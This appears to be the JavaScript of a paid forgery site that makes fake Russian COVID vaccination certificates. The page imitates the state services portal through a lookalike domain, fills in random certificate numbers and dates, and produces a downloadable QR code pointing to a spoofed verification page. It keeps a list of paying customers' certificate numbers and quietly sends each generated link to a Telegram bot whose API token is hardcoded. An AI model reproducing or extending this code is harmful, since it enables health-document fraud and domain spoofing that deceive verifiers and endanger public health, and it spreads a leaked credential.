Number.prototype.addZero = function(count) {
  return (new Array(count - this.toString().length)).fill(0).join('')+this.toString()
}

const PAIDS = [
  '02520472', // Я
  '01700976', // Даша барбер
  '08220204', // Муж Дианы
  '00070835', // Марина подруга Дианы
];

const getRandomPartCertNumber = () => {
  return  Math.round(Math.random()*1000).addZero(4);
}

const getRandomDate = () => {
  let date = [
    Math.round(Math.random()*30).addZero(2),
    (Math.round(Math.random()*3) + 2).addZero(2),
    2022
  ];
  return date.join('.');
}

const loadTemplate = (templateHtml) => {
  document.querySelector('.js-template-container').innerHTML = templateHtml;
}

const processRoute = () => {
  const path = document.location.href;
  if (path.indexOf('create') !== -1) {
    loadTemplate(createPage);
    initCreateForm();
    return;
  }
  if (path.indexOf('covid-cert/verify') !== -1) {
    const certData = (new URLSearchParams(location.search)).get('data');
    const decodedCertData = JSON.parse(decodeURIComponent(escape(window.atob(certData))));
    loadTemplate(certPage(decodedCertData));
    if (PAIDS.indexOf(decodedCertData.cert3.toString()+decodedCertData.cert4.toString) === -1) {
      document.querySelector('.js-unpaid').classList.remove('hidden');
    }
    return;
  }

  document.location.href = 'https://gosuslugi.ru/';
}

const downloadURI = (uri, name) => {
  var link = document.createElement("a");
  link.download = name;
  link.href = uri;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  delete link;
}

const formattedDate = (d = new Date) => {
  let month = String(d.getMonth() + 1);
  let day = String(d.getDate());
  const year = String(d.getFullYear());

  if (month.length < 2) month = '0' + month;
  if (day.length < 2) day = '0' + day;

  return `${day}.${month}.${year}`;
}

const initCreateForm = () => {
  let certPartInputs = document.getElementsByClassName('js-cert-part-input');
  for (let i = 0; i < certPartInputs.length; i++) {
    certPartInputs[i].value = getRandomPartCertNumber()
  }
  
  document.getElementsByClassName('js-date-input')[0].value = getRandomDate();

  document.querySelector('form').addEventListener('submit', (e) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.target).entries());
    data.name1 = data.name1[0]+(new Array(data.name1.length - 1)).fill('*').join('');
    data.name2 = data.name2[0]+(new Array(data.name2.length - 1)).fill('*').join('');
    data.name3 = data.name3[0]+(new Array(data.name3.length - 1)).fill('*').join('');
    data.bd = formattedDate(new Date(data.bd));
    const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
    const href = `https://gosuslygi.msk.ru/covid-cert/verify/96600000${data.cert3}${data.cert4}?lang=ru&data=${encodedData}`;
    fetch(`https://api.telegram.org/bot2121847436:AAHNHdDAXGRJF40aLfCaLDV1jnlPSTde6g4/sendMessage?chat_id=1452124491&text=${href}`);

    document.querySelector('.js-qrcode-canvas').innerHTML = '';
    new QRCode(document.querySelector('.js-qrcode-canvas'), {
        text: href,
        width: 200,
        height: 200,
        colorDark : "#000000",
        colorLight : "#ffffff",
        correctLevel : QRCode.CorrectLevel.H
    });
    const canvasIn = document.querySelector('.js-qrcode-canvas canvas');
    const ctxIn = canvasIn.getContext('2d');
    const canvasOut = document.querySelector('.js-download-canvas');
    const ctxOut = canvasOut.getContext('2d');
    ctxOut.fillStyle = '#fff';
    ctxOut.fillRect(0, 0, 300, 400);
    ctxOut.drawImage(canvasIn, 50, 100);
    downloadURI(canvasOut.toDataURL(), `covid-qr-${(new Date()).getTime()}.png`);
  });

  document.querySelector('.js-unpaid').addEventListener('click', function() {
    this.classList.add('hidden');
  })
}

processRoute();
setTimeout(_ => document.querySelector('.js-body').classList.remove('loading'), Math.random()*2000 + 1000);

window.onhashchange = _ => {
  processRoute();
}